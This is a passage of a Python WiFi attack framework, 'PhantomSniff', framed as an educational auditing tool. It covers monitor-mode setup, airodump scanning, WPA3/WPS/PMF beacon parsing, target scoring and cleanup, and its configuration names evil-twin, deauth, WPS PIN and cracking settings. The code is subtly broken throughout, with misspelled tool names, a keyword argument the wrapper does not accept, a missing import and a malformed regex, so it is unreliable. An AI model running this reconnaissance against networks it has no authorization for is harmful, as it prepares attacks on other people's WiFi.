#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhantomSniff — educational WiFi auditing & learning framework (single file)
Python 3.8+ | stdlib + scapy only | external open-source tools via subprocess

INTENDED USE: authorized lab study against YOUR OWN access points, your own
router, and networks for which you hold written authorization.

LEGAL NOTICE: unauthorized access to WiFi networks is illegal (CFAA in the US,
Computer Misuse Act in the UK, and equivalent laws worldwide). This tool is a
study aid; the operator is responsible for every packet it injects.
"""

import csv
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import queue
import http.server
import socketserver
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

try:
    from scapy.all import (Dot11, Dot11Beacon, Dot11Elt, EAPOL, EAPOLKey,
                           PcapReader, sniff, conf)
    conf.verb = 0
except ImportError:
    print("FATAL: scapy is required. Install:  pip3 install scapy", file=sys.stderr)
    sys.exit(2)


VERSION = "1.0.0"

BANNER = r"""
  ____  _   _         _        ____       _     __ _
 |  _ \| | | | __ _  / \  _ __ / ___|    / \  ( _ )
 | |_) | |_| |/ _` | / _ \| '_ \  ___) | | | |/ _| |_| |
 |  __/|  _  | (_| |/ ___ \ | | | |___) | | | |  _|  _| |
 |_|   |_|_| \__,_/_/_   \_\_| |_|____/|_| |_|_|_|_|_| |__,_|
                                                                  |___/
                  v%s  — WiFi Auditing & Learning Framework
================================================================================
  AUTHORIZED LAB USE ONLY — study your own networks.
  Unauthorized WiFi access is illegal (CFAA, Computer Misuse Act).
================================================================================
""" % VERSION

# ---------------------------------------------------------------------------
# Global config / constants
# ---------------------------------------------------------------------------

CONFIG = {
    "SCAN_TIME": 45,                # default airodump scan duration (seconds)
    "MAX_DEAUTH_ROUNDS": 5,
    "HANDSHAKE_ROUND_TIME": 35,
    "PMKID_CAPTURE_TIME": 75,
    "PIXIE_TIMEOUT": 180,
    "PIN_FALLBACK_TIMEOUT": 240,
    "EVIL_TWIN_IP": "10.66.0.1",
    "EVIL_TWIN_NET": "10.66.0.0/24",
    "EVIL_TWIN_DHCP_START": "10.66.0.10",
    "EVIL_TWIN_DHCP_END": "10.66.0.100",
    "EVIL_TWIN_PORT": 80,
    "WEP_MAX_IVS": 20000,
    "WEP_CAPTURE_TIMEOUT": 120,
    "HASHCAT_GPU_TIMEOUT": 900,
    "HASHCAT_CPU_TIMEOUT": 1800,
    "WORDLIST_MIN_SIZE": 1024 * 1024,   # 1 MB sanity floor
    "BEACON_SNIFF_TIME": 8,
}


def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ---------------------------------------------------------------------------
# Color / Log / subprocess wrappers
# ---------------------------------------------------------------------------

class Color:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"

    @staticmethod
    def wrap(text: str, color: str) -> str:
        if not sys.stdout.isatty():
            return text
        return f"{color}{text}{Color.RESET}"


class Log:
    VERBOSE = False

    @staticmethod
    def info(msg):    print(f"{Color.wrap('[ *]', Color.BLUE)} {msg}")
    @staticmethod
    def ok(msg):      print(f"{Color.wrap('[ +]', Color.GREEN)} {msg}")
    @staticmethod
    def warn(msg):    print(f"{Color.wrap('[ !]', Color.YELLOW)} {msg}")
    @staticmethod
    def err(msg):     print(f"{Color.wrap('[ -]', Color.RED)} {msg}")
    @staticmethod
    def section(msg): print(f"\n{Color.wrap('==== ' + msg + ' ====', Color.CYAN)}")
    @staticmethod
    def proto(msg):    print(f"    {Color.wrap('[lesson]', Color.MAGENTA)} {msg}")
    @staticmethod
    def verbose(msg):
        if Log.VERBOSE:
            print(f"    {Color.wrap('[debug]', Color.DIM)} {msg}")


class CmdResult:
    __slots__ = ("cmd", "rc", "stdout", "stder", "timed_out", "duration")

    def __init__(self, cmd: List[str], rc: int, stdout: str, stderr: str,
                 timed_out: bool, duration: float):
        self.cmd = cmd; self.rc = rc; self.stdout = stdout or ""
        self.stderr = stderr or ""; self.timed_out = timed_out
        self.duration = duration

    @property
    def ok(self) -> bool:
        return (not self.timed_out) and self.rc == 0

    def tail(self, which: str = "stderr", n: int = 8) -> str:
        text = self.stderr if which == "stderr" else self.stdout
        lines = [l for l in text.splitlines() if l.strip()]
        return "\n".join(lines[-n:])


def cmd_str(cmd: List[str]) -> str:
    return " ".join(shlex.quote(c) for c in cmd)


def run_cmd(cmd, timeout: int = 30, silent: bool = False, fix_hint: Optional[str] = None) -> CmdResult:
    if isinstance(cmd, str):
        cmd = shlex.split(cmd)
    Log.verbose("$ " + cmd_str(cmd))
    start = time.time()
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
        res = CmdResult(cmd, p.returncode, p.stdout, p.stderr, False, time.time() - start)
    except subprocess.TimeoutExpired as e:
        res = CmdResult(cmd, -1, e.stdout or "", e.stderr or "", True, time.time() - start)
    except FileNotFoundError:
        Log.err(f"Command not found: {cmd[0]} — install it or fix PATH.")
        raise

    if not res.ok and not silent:
        Log.err(f"Command failed ({'timeout' if res.timed_out else 'exit ' + str(res.rc)}): "
                + cmd_str(cmd))
        for line in res.tail("stderr", 6).splitlines():
            if line.strip():
                Log.err("  stderr | " + line.strip())
        if fix_hint:
            Log.warn(f"Fix: {fix_hint}")
    return res


def stream_cmd(cmd, on_stdout: Optional[callable] = None,
               on_stderr: Optional[callable] = None,
               timeout: Optional[int] = None,
               fix_hint: Optional[str] = None) -> CmdResult:
    if isinstance(cmd, str):
        cmd = shlex.split(cmd)
    Log.verbose("$ " + cmd_str(cmd))
    stdout_lines: List[str] = []
    stderr_lines: List[str] = []
    start = time.time()

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, bufsize=1, start_new_session=True)
    timed_out = {"flag": False}

    def _kill():
        timed_out["flag"] = True
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass

    timer = None
    if timeout is not None:
        timer = threading.Timer(timeout, _kill)
        timer.daemon = True
        timer.start()

    def _pump(stream, sink, cb):
        try:
            for line in iter(stream.readline, ""):
                line = line.rstrip("\n")
                sink.append(line)
                if cb: cb(line)
        except Exception as e:
            Log.verbose(f"stream pump ended: {e}")
        finally:
            try:
                stream.close()
            except Exception:
                pass

    t1 = threading.Thread(target=_pump, args=(proc.stdout, stdout_lines, on_stdout), daemon=True)
    t2 = threading.Thread(target=_pump, args=(proc.stderr, stderr_lines, on_stderr), daemon=True)
    t1.start(); t2.start()

    rc = proc.wait()
    t1.join(timeout=2); t2.join(timeout=2)
    if timer:
        timer.cancel()

    res = CmdResult(cmd, rc, "\n".join(stdout_lines), "\n".join(stderr_lines),
                    timed_out["flag"], time.time() - start)
    if not res.ok and not timed_out["flag"]:
        # Only print stderr if no custom callback is handling output
        if on_stdout is None and on_stderr is None:
            Log.err(f"Command failed: {cmd_str(cmd)}")
            for line in res.tail("stderr", 5).splitlines():
                if line.strip():
                    Log.err("  stderr | " + line.strip())
            if fix_hint:
                Log.warn(f"Fix: {fix_hint}")
    return res


def spawn_background(state: "State", cmd, log_path: Optional[Path] = None) -> subprocess.Popen:
    if isinstance(cmd, str):
        cmd = shlex.split(cmd)
    Log.verbose("(background) $ " + cmd_str(cmd))
    kw = dict(text=True, bufsize=1, start_new_session=True)
    if log_path:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        fh = open(log_path, "a+")
        kw["stdout"] = fh
        kw["stderr"] = subprocess.STDOUT
    else:
        kw["stdout"] = subprocess.DEVNULL
        kw["stderr"] = subprocess.DEVNULL
    proc = subprocess.Popen(cmd, **kw)
    state.children.append(proc)
    return proc


# ---------------------------------------------------------------------------
# State — mutable object threaded through every phase.
# ---------------------------------------------------------------------------

class State:
    def __init__(self):
        self.args: Optional[argparse.Namespace] = None
        self.orig_iface: Optional[str] = None
        self.mon_iface: Optional[str] = None
        self.workspace: Optional[Path] = None
        self.captures_dir: Optional[Path] = None
        self.creds_path: Optional[Path] = None
        self.target: Optional[Dict[str, Any]] = None
        self.children: List[subprocess.Popen] = []
        self.timeline: List[Dict[str, Any]] = []
        self.credentials: List[Dict[str, Any]] = []
        self.errors: List[str] = []
        self.handshake_cap: Optional[Path] = None
        self.pmkid_hash: Optional[Path] = None
        self.report_written = False
        self.cleaned_up = False
        self.start_time = datetime.now()
        self.tool_versions: Dict[str, str] = {}


def log_event(state: State, action: str, command: str, result: str, detail: str = "") -> None:
    state.timeline.append({
        "ts": now_str(),
        "action": action,
        "command": command,
        "result": result,
        "detail": detail,
    })


def collect_tool_versions(state: State) -> None:
    for tool in ("aircrack-ng", "airodump-ng", "aireplay-ng", "hcxdumptool",
                 "hcxpcapngtool", "reaver", "pixiewps", "mdk4", "haschat",
                 "hosapd", "dnsmasq", "iw", "rfkill", "tcpdump", "curl"):
        res = run_cmd([tool, "--version"], timeout=8, silent=True, fix_hint=None)
        if res.ok and res.stdout.strip():
            state.tool_versions[tool] = res.stdout.strip().splitlines()[0][:120]
        elif res.stderr.strip():
            state.tool_versions[tool] = res.stderr.strip().splitlines()[0][:120]
        else:
            state.tool_versions[tool] = "not installed"


# ---------------------------------------------------------------------------
# Consent gate
# ---------------------------------------------------------------------------

def consent_gate(state: State) -> bool:
    args = state.args
    # Scan-only needs no consent; headless with --yes implies intent.
    if getattr(args, "scn_only", False) or args.scan_only:
        return True
    if args.attack in (None, "scan"):
        return True
    if args.headless and args.yes:
        Log.warn("Headless + --yes: operator explicitly asserted authorized-lab use.")
        return True
    if args.headless:
        Log.err("--headless requires --yes when an attack is requested.")
        return False
    print()
    Log.warn("You are about to enable ATTACK modules.")
    while True:
        try:
            resp = input("Type  I AGREE  (uppercase) to continue, or anything else to abort: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return False
        if resp == "I AGREE":
            return True
        Log.err("Consent not given. Aborting before any attack module runs.")
        return False


# ---------------------------------------------------------------------------
# DependencyManager
# ---------------------------------------------------------------------------

class DependencyManager:
    TOOLS: Dict[str, Tuple[str, str, str, str]] = {
        "ip":          ("iproute2",    "sudo apt install -y iproute2",      "sudo dnf install -y iproute",      "sudo pacman -S iproute2"),
        "iw":          ("iw",          "sudo apt install -y iw",             "sudo dnf install -y iw",             "sudo pacman -S iw"),
        "rfkill":      ("rfkill",      "sudo apt install -y rfkill",         "sudo dnf install -y rfkill",         "sudo pacman -S rfkill"),
        "tcpdump":     ("tcpdump",     "sudo apt install -y tcpdump",        "sudo dnf install -y tcpdump",        "sudo pacman -S tcpdump"),
        "curl":        ("curl",        "sudo apt install -y curl",           "sudo dnf install -y curl",           "sudo pacman -S curl"),
        "airmon-ng":   ("aircrack-ng", "sudo apt install -y aircrack-ng",   "sudo dnf install -y aircrack-ng",   "sudo pacman -S aircrack-ng"),
        "airodump-ng": ("aircrack-ng", "sudo apt install -y aircrack-ng",   "sudo dnf install -y aircrack-ng",   "sudo pacman -S aircrack-ng"),
        "aireplay-ng": ("aircrack-ng", "sudo apt install -y aircrack-ng",   "sudo dnf install -y aircrack-ng",   "sudo pacman -S aircrack-ng"),
        "aircrack-ng": ("aircrack-ng", "sudo apt install -y aircrack-ng",   "sudo dnf install -y aircrack-ng",   "sudo pacman -S aircrack-ng"),
        "hcxdumptool": ("hcxtools",    "sudo apt install -y hcxtools",       "sudo dnf install -y hcxtools",       "sudo pacman -S hcxtools"),
        "hcxpcapngtool": ("hcxtools",  "sudo apt install -y hcxtools",       "sudo dnf install -y hcxtools",       "sudo pacman -S hcxtools"),
        "reaver":       ("reaver",      "sudo apt install -y reaver",         "sudo dnf install -y reaver",         "sudo pacman -S reaver || yay -S reaver"),
        "pixiewps":     ("pixiewps",    "sudo apt install -y pixiewps",       "sudo dnf install -y pixiewps",       "sudo pacman -S pixiewps || yay -S pixiewps"),
        "mdk4":         ("mdk4",        "sudo apt install -y mdk4",           "sudo dnf install -y mdk4",           "sudo pacman -S mdk4 || yay -S mdk4"),
        "haschat":      ("haschat",     "sudo apt install -y haschat",        "sudo dnf install -y haschat",        "sudo pacman -S haschat"),
        "hosapd":       ("hosapd",      "sudo apt install -y hosapd",        "sudo dnf install -y hosapd",        "sudo pacman -S hosapd"),
        "dnsmasq":      ("dnsmasq",     "sudo apt install -y dnsmasq",        "sudo dnf install -y dnsmasq",        "sudo pacman -S dnsmasq"),
    }

    CRITICAL = ("iw", "ip", "rfkill", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng")

    @staticmethod
    def which(tool: str) -> Optional[str]:
        path = shutil.which(tool)
        if path and os.access(path, os.X_OK):
            return path
        return None

    @classmethod
    def check(cls) -> List[Dict[str, Any]]:
        statuses = []
        for name, (pkg, apt, dnf, pacman) in cls.TOOLS.items():
            path = cls.which(name)
            statuses.append({
                "name": name,
                "ok": path is not None,
                "path": path or "",
                "hint": apt if path is None else "",
            })
        return statuses

    @classmethod
    def missing(cls, tools: List[str]) -> List[str]:
        miss = [t for t in tools if not cls.which(t)]
        for t in miss:
            if t in cls.TOOLS:
                Log.err(f"Missing dependency: {t}")
                Log.warn(f"  install hint: {cls.TOOLS[t][1]}")
        return miss

    @classmethod
    def hint(cls, tool: str) -> str:
        entry = cls.TOOLS.get(tool)
        return entry[1] if entry else f"install '{tool}' from your distro"


# ---------------------------------------------------------------------------
# Preflight
# ---------------------------------------------------------------------------

class Preflight:
    def __init__(self, args):
        self.args = args
        self.adapters = self.detect_adapters()
        self.deps = DependencyManager.check()
        self.vm = self.detect_vm()
        self.root = (os.getuid() == 0) if hasattr(os, "getuid") else False
        self.bands = self.detect_bands()
        self.monitor_capable = "monitor" in self.bands.get("modes", [])

    @staticmethod
    def detect_vm() -> Optional[str]:
        res = run_cmd(["systemd-detect-vert"], timeOut=8, silent=True)
        if res.ok and res.stdout.strip().lower() not in ("none", ""):
            return res.stdout.strip()
        for path in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"):
            try:
                txt = Path(path).read_text().strip()
                if txt and any(v in txt.lower() for v in ("vmb", "virtualbox", "qemu", "kvm", "xen")):
                    return txt
            except OSError:
                pass
        return None

    @staticmethod
    def detect_adapters() -> List[Dict[str, str]]:
        adps = []
        net = Path("/sys/class/net")
        if not net.exists():
            return adps
        for dev in sorted(net.iterdir()):
            if (dev / "wireless").exists():
                drv = ""
                try:
                    drv = os.path.basename(os.path.realpath(dev / "device" / "driver"))
                except OSError:
                    drv = "unknown"
                adps.append({"iface": dev.name, "driver": drv, "path": str(dev)})
        return adps

    @staticmethod
    def detect_bands() -> Dict[str, Any]:
        res = run_cmd(["iw", "list"], timeOut=15, silent=True)
        out = res.stdout
        bands = []
        modes = []
        if "Band 1:" in out:
            bands.append("2.4 GHz")
        if "Band 2:" in out:
            bands.append("5 GHz")
        if "Band 4:" in out:
            bands.append("6 GHz")
        m = re.search(r"Supported interface modes:\s*(._?)(?:\n\S|\Z)", out, re.DOTALL)
        if m:
            modes = [l.strip() for l in m.group(1).splitlines() if l.strip()]
        return {"bands": bands, "modes": modes}

    def print_table(self) -> None:
        print()
        print(Color.wrap("== PREFLIGHT ==", Color.CYAN))
        print(f"  root(euid=0)  : {'[OK]' if self.root else '[FAIL] must run as root (sudo)'}")
        print(f"  virtualized   : {self.vm or 'no (bare metal)'}")
        if self.adapters:
            for a in self.adapters:
                print(f"  adapter       : {a['iface']}  chipset/driver: {a['driver'] or 'unknown'}")
        else:
            print("  adapter       : [FAIL] no wireless adapters in /sys/class/net/*/wireless")
        print(f"  bands         : {', '.join(self.bands.get('bands', []) or 'unknown')}")
        print(f"  monitor mode  : {'[OK] advertised by driver' if self.monitor_capable else '[WARN] not advertised'}")
        print()
        print(f"  {'tool':<14} {'status':<10} hint")
        print(f"  {'----':<14} {'------':<10} ----")
        for d in self.deps:
            status = "[OK]" if d["ok"] else "[MISSING]"
            loc = d["path"] if d["ok"] else d["hint"]
            print(f"  {d['name']:<14} {status:<10} {loc}")
        print()

    def run(self) -> bool:
        self.print_table()
        problems = []
        if not self.root:
            problems.append("Not running as root — re-run: sudo python3 phantomsniff.py ... ")
        if not self.adapters:
            problems.append("No wireless adapters found. Plug in an external USB adapter and retry.")
        else:
            if not self.monitor_capable:
                problems.append("Driver does not advertise monitor mode — try an AR9271/RT3070/RTL8812AU adapter.")
        if not DependencyManager.which("iw") or not DependencyManager.which("ip") or not DependencyManager.which("rfkill"):
            problems.append("Missing core network tools (iw/ip/rfkill) — see install hints above.")
        crit_deps = [d for d in self.deps if d["name"] in DependencyManager.CRITICAL and not d["ok"]]
        if crit_deps:
            problems.append("Missing critical dependencies: " + ", ".join(d["name"] for d in crit_deps))
        if problems:
            Log.err("Preflight found critical problems:")
            for p in problems:
                print("   - " + p)
            return False
        Log.ok("Preflight passed.")
        return True


# ---------------------------------------------------------------------------
# Cleanup / restore
# ---------------------------------------------------------------------------

def cleanup_and_restore(state: State) -> None:
    if state.cleaned_up:
        return
    state.cleaned_up = True
    Log.section("CLEANUP & RESTORE")

    for name in ("airodump-ng", "aireplay-ng", "aircrack-ng", "reaver",
                 "hcxdumptool", "hcxpcapngtool", "haschat", "hosapd",
                 "dnsmasq", "mdk4", "airmon-ng"):
        res = run_cmd(["pkill", "-f", r"(^|/)" + re.escape(name) + r"(\s|$)",],
                      timeout=5, silent=True)
        if res.rc == 0:
            Log.info(f"Killed running {name}")

    for child in state.children[:]:
        if child.poll() is None:
            try:
                os.killpg(os.getpgid(child.pid), signal.SIGTERM)
                Log.verbose(f"Sent SIGTERM to child PID {child.pid}")
            except (ProcessLookupError, PermissionError):
                pass
    state.children.clear()
    time.sleep(1)

    candidates: List[str] = []
    if state.mon_iface:
        candidates.append(state.mon_iface)
    res = run_cmd(["iw", "dev"], timeOut=10, silent=True)
    cur_iface = None
    for line in res.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            parts = line.split()
            if parts:
                cur_iface = parts[-1]
        elif line.startswith("type monitor") and cur_iface:
            candidates.append(cur_iface)
    for mon in dict.fromkeys(candidates):
        r1 = run_cmd(["airmon-ng", "stop", mon], timeOut=20, silent=True)
        if r1.ok:
            Log.ok(f"Monitor interface stopped: {mon} (airmon-ng)")
        else:
            Log.warn(f"airmon-ng stop failed for {mon} — trying iw dev del")
            r2 = run_cmd(["iw", "dev", mon, "del"], timeOut=10, silent=True)
            if r2.ok:
                Log.ok(f"Monitor interface removed: {mon} (iw dev del)")
            else:
                Log.err(f"Could not remove {mon}: airmon-ng and iw both failed")

    r3 = run_cmd(["rfkill", "unblock", "wifi"], timeOut=10, silent=True)
    Log.ok("rfkill unblock wifi" if r3.ok else Log.err("rfkill unblock failed: " + r3.tail()))

    for svc in ("NetworkManager", "wpa_supplicant"):
        r4 = run_cmd(["systemctl", "restart", svc], timeOut=30, silent=True)
        if r4.ok:
            Log.info(f"Restarted {svc}")
        else:
            Log.verbose(f"Could not restart {svc}: {r4.tail() or 'no systemd or not installed'}")

    if state.orig_iface:
        r5 = run_cmd(["ip", "link", "set", state.orig_iface, "up"], timeOut=10, silent=True)
        if r5.ok:
            Log.info(f"Interface {state.orig_iface} is back up")
        else:
            Log.warn(f"Could not bring up {state.orig_iface}: {r5.tail() or 'unknown'}")

    Log.ok("Cleanup complete.")


# ---------------------------------------------------------------------------
# InterfaceManager
# ---------------------------------------------------------------------------

class InterfaceManager:
    def __init__(self, state: State):
        self.state = state
        self.adapters = Preflight.detect_adapters()

    def _iface_is_monitor(self, iface: str) -> bool:
        res = run_cmd(["iw", iface, "info"], timeOut=8, silent=True)
        return res.ok and "type monitor" in res.stderr + res.stdout

    def _find_monitor_interface(self) -> Optional[str]:
        res = run_cmd(["iw", "dev"], timeOut=8, silent=True)
        iface = None
        for line in res.stdout.splitlines():
            line = line.strip()
            if line.startswith("Interface "):
                parts = line.split()
                iface = parts[-1] if parts else None
            elif line.startswith("type monitor") and iface:
                if self._iface_is_monitor(iface):
                    return iface
        return None

    def setup(self, iface: Optional[str] = None) -> bool:
        if not iface:
            if self.adapters:
                iface = self.adapters[0]["iface"]
            else:
                Log.err("No wireless interface available.")
                return False
        self.state.orig_iface = iface
        Log.section("INTERFACE SETUP")
        Log.info(f"Using physical interface: {iface}")

        r0 = run_cmd(["rfkill", "unblock", "wifi"], timeOut=10, silent=True)
        Log.ok("rfkill: wifi unblocked" if r0.ok else "rfkill unblock reported an issue: " + r0.tail())

        r1 = run_cmd(["airmon-ng", "check", "kill"], timeOut=60, silent=False)
        Log.info("airmon-ng check kill completed")

        if self._iface_is_monitor(iface):
            Log.ok(f"{iface} is already in monitor mode.")
            self.state.mon_iface = iface
            return True

        r2 = run_cmd(["airmon-ng", "start", iface], timeOut=60,
                     fix_hint="Adapter may not support monitor mode; try an AR9271/RT3070/RTL8812AU.")
        if not r2.ok:
            Log.err("airmon-ng start failed.")
            return False

        mon = self._find_monitor_interface()
        if not mon:
            Log.err("Could not find a real monitor-mode interface after airmon-ng start (P6).")
            cleanup_and_restore(self.state)
            return False
        self.state.mon_iface = mon
        Log.ok(f"Monitor interface verified via iw dev + iw info: {mon}")
        return True

    def verify(self) -> bool:
        if not self.state.mon_iface or not self._iface_is_monitor(self.state.mon_iface):
            Log.err(f"Monitor interface {self.state.mon_iface or '<none>'} is no longer in monitor mode.")
            return False
        Log.verbose(f"monitor check OK: {self.state.mon_iface}")
        return True

    def set_channel(self, ch: int) -> None:
        if not self.state.mon_iface:
            return
        r = run_cmd(["iw", "dev", self.state.mon_iface, "set", "channel", str(ch)],
                     timeOut=10, silent=True)
        if r.ok:
            Log.verbose(f"channel set: {ch}")
        else:
            Log.warn(f"Could not set channel {ch} directly (driver quirk) — airodump-ng will hop anyway.")


# ---------------------------------------------------------------------------
# RSN / WPA parsers
# ---------------------------------------------------------------------------

def parse_rsn_element(info: bytes) -> Dict[str, Any]:
    out = {"akms": [], "mfp_capable": None, "mfp_required": None}
    try:
        if len(info) < 2:
            return out
        version = int.from_bytes(info[0:2], "little")
        if version != 1:
            return out
        g_cipher = info[2:6]
        pw_count = int.from_bytes(info[6:8], "little")
        pos = 8
        pos += pw_count * 4
        if len(info) < pos + 2:
            return out
        akm_count = int.from_bytes(info[pos:pos+2], "little")
        pos += 2
        for _ in range(akm_count):
            if len(info) < pos + 4:
                return out
            suite = info[pos:pos+4]
            if suite[0:3] == bytes.fromhex("000fac"):
                out["akms"].append(suite[3])
            pos += 4
        if len(info) < pos + 2:
            return out
        caps = int.from_bytes(info[pos:pos+2], "little")
        out["mfp_capable"] = bool(caps & 0x80)   # bit 7
        out["mfp_required"] = bool(caps & 0x40)  # bit 6
    except Exception as e:
        Log.verbose(f"RSN parse issue: {e}")
    return out


def parse_wpa_element(info: bytes) -> bool:
    return len(info) >= 6 and info[0:3] == bytes.fromhex("0050f2") and info[3] == 1


def parse_wps_element(info: bytes) -> bool:
    return len(info) >= 6 and info[0:3] == bytes.fromhex("0050f2") and info[3] == 4


def _iter_dot11_elts(pkt):
    elt = pkt.getlayer(Dot11Elt)
    while isinstance(elt, Dot11Elt):
        yield elt
        elt = elt.payload


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class Scanner:
    def __init__(self, state: State):
        self.state = state
        self.aps: List[Dict[str, Any]] = []
        self.stations: Dict[str, Any] = {}
        self.clients_by_ap: Dict[str, List[str]] = {}

    def scan(self, band: str = "abg", scan_time: int = None, bssid: str = None,
             channel: int = None) -> bool:
        mon = self.state.mon_iface
        if not mon:
            Log.err("Monitor interface not set.")
            return False
        scan_time = scan_time or CONFIG["SCAN_TIME"]
        prefix = self.state.captures_dir / "scan"
        csv_path = self.state.captures_dir / "scan-01.csv"

        # P9: band order is always 'abg'
        cmd = ["airodump-ng", mon, "--write", str(prefix), "--write-format", "csv",
               "--write-interval", "1", "--band", band]
        if channel:
            cmd += ["--channel", str(channel)]
        if bssid:
            cmd += ["--bssid", bssid]
        Log.info(f"Scanning {scan_time}s ... (band={band}" + (f", ch={channel}" if channel else "") + ")")
        proc = spawn_background(self.state, cmd, log_path=self.state.captures_dir / "airodump-scan.log")
        time.sleep(scan_time)
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, PermissionError):
            pass
        time.sleep(2)
        if not csv_path.exists():
            Log.err("airodump-ng produced no CSV.")
            return False
        self.parse_csv(csv_path)
        self.enrich_beacons(mon, channel or None)
        self.assign_clients()
        return True

    def parse_csv(self, path: Path) -> None:
        aps = []
        stations = {}
        in_stations = False
        with open(path, newline="", encoding="utf-8", errors="replace") as fh:
            reader = csv.reader(fh)
            for row in reader:
                if not row or not row[0]:
                    continue
                first = row[0].strip()
                if first.startswith("BSSID"):
                    continue
                if first.startswith("Station MAC"):
                    in_stations = True
                    continue
                if not in_stations:
                    if len(row) < 14:
                        continue
                    try:
                        bssid = row[0].strip().upper()
                        channel = row[3].strip()
                        privacy = row[5].strip()
                        cipher = row[6].strip()
                        auth = row[7].strip()
                        power_s = row[8].strip()
                        power = int(power_s) if power_s.lstrip("-").isdigit() else -100
                        beacons = row[9].strip()
                        ivs = row[10].strip()
                        id_len_s = row[12].strip()
                        id_len = int(id_len_s) if id_len_s.isdigit() else 0
                        essid = row[13].strip() if len(row) > 13 else ""
                        if id_len and len(essid) > id_len:
                            essid = essid[:id_len]
                        if not bssid or bssid.startswith("0"*12):
                            continue
                    except (ValueError, IndexError) as e:
                        Log.verbose(f"CSV AP row skip: {e}")
                        continue
                    aps.append({
                        "bssid": bssid,
                        "essid": essid,
                        "channel": channel,
                        "privacy": privacy,
                        "cipher": cipher,
                        "auth": auth,
                        "power": power,
                        "beacons": beacons,
                        "ivs": ivs,
                        "clients": 0,
                        "data": 0,
                        "encryption": privacy + "/" + cipher + "/" + auth,
                        "wps": False,
                        "wpa3": False,
                        "sae_only": False,
                        "pmf": "unknown",
                        "akms": [],
                    })
                else:
                    if len(row) < 6:
                        continue
                    sta_mac = row[0].strip().upper()
                    power_s = row[3].strip()
                    power = int(power_s) if power_s.lstrip("-").isdigit() else -100
                    bssid = row[5].strip().upper()
                    probed = row[6].strip() if len(row) > 6 else ""
                    stations[sta_mac] = {"bssid": bssid, "power": power, "probed": probed}
        self.aps = aps
        self.stations = stations
        Log.ok(f"CSV parsed: {len(aps)} APs, {len(stations)} stations")

    def enrich_beacons(self, mon: str, channel: Optional[int] = None) -> None:
        if not self.aps or not mon:
            return
        Log.info(f"Sniffing beacons for {CONFIG['BEACON_SNIFF_TIME']}s to enrich WPA3/WPS/PMF details ...")
        seen: Dict[str, Any] = {}

        def _cb(pkt):
            if pkt.haslayer(Dot11Beacon):
                bssid = getattr(pkt, "addr3", None)
                if not bssid:
                    return
                bssid = bssid.upper()
                if bssid in seen or not any(a["bssid"] == bssid for a in self.aps):
                    return
                info = {"wps": False, "wpa3": False, "sae_only": False, "akms": [],
                        "pmf": "unknown"}
                for el in _iter_dot11_elts(pkt):
                    if el.ID == 48 and el.info:
                        rsn = parse_rsn_element(el.info)
                        info["akms"] = rsn["akms"]
                        info["sae_only"] = (rsn["akms"] == [8])
                        info["wpa3"] = 8 in rsn["akms"]
                        if rsn["mfp_required"]:
                            info["pmf"] = "required"
                        elif rsn["mfp_capable"]:
                            info["pmf"] = "capable"
                    elif el.ID == 221 and el.info:
                        if parse_wps_element(el.info):
                            info["wps"] = True
                if info["akms"]:
                    seen[bssid] = info

        try:
            sniff(iface=mon, prn=_cb, store=False, timeout=CONFIG["BEACON_SNIFF_TIME"],
                  monitor=True)
        except Exception as e:
            import traceback
            traceback.print_exc()
            Log.warn(f"Beacon sniffing failed ({e}); PMF/WPA3 status unknown — deauth may fail.")

        for ap in self.aps:
            en = seen.get(ap["bssid"])
            if en:
                ap.update(en)
        known = sum(1 for a in self.aps if a.get("akms"))
        Log.ok(f"Beacon enrichment complete: RSN details for {known}/{len(self.aps)} APs")

    def assign_clients(self) -> None:
        counts: Dict[str, int] = {}
        for sta in self.stations.values():
            bssid = sta["bssid"].upper()
            counts[bssid] = counts.get(bssid, 0) + 1
        for ap in self.aps:
            ap["clients"] = counts.get(ap["bssid"], 0)

    def score(self, ap: Dict[str, Any]) -> float:
        s = 0.0
        try:
            s += max(0, (100 + ap["power"]) * 1.0)
        except (TypeError, ValueError):
            pass
        s += ap.get("clients", 0) * 2.0
        if ap.get("wps"):
            s += 6.0
        if ap.get("wpa3") and not ap.get("sae_only"):
            s += 3.0
        return round(s, 1)

    def sorted_aps(self) -> List[Dict[str, Any]]:
        return sorted(self.aps, key=self.score, reverse=True)

    def display_table(self) -> None:
        if not self.aps:
            Log.warn("No access points observed.")
            return
        print()
        print(f"{Color.wrap('#', Color.DIM)}  {'ESSID':<28} {'BSSID':<18} {'CH':<4} "
              f"{'SECURITY':<36} {'PMF':<9} {'PWR':<4} {'CL':<3}")
        print("-" * 110)
        for i, ap in enumerate(self.sorted_aps(), 1):
            essid = ap["essid"][:28] or "<hidden>"
            sec = []
            if ap.get("wpa3"):
                sec.append("WPA3")
            elif "WPA" in ap.get("privacy", ""):
                sec.append("WPA")
            if "SAE" in ap.get("auth", "") or ap.get("sae_only"):
                sec.append("SAE-only" if ap.get("sae_only") else "SAE+PSK")
            if "WEP" in ap.get("privacy", ""):
                sec.append("WEP")
            if not sec:
                sec.append(ap.get("privacy", ""))
            sec.append("WPS" if ap.get("wps") else "-")
            sec_badge = " ".join(s for s in sec if s != "-")
            pmf = {"required": "REQ", "capable": "CAP", "unknown": "?"}.get(ap.get("pmf", "unknown"), "?")
            print(f"{i:<3} {essid:<28} {ap['bssid']:<18} {ap['channel']:<4} "
                  f"{sec_badge:<36} {pmf:<9} {ap['power']:<4} {ap['clients']:<3}")
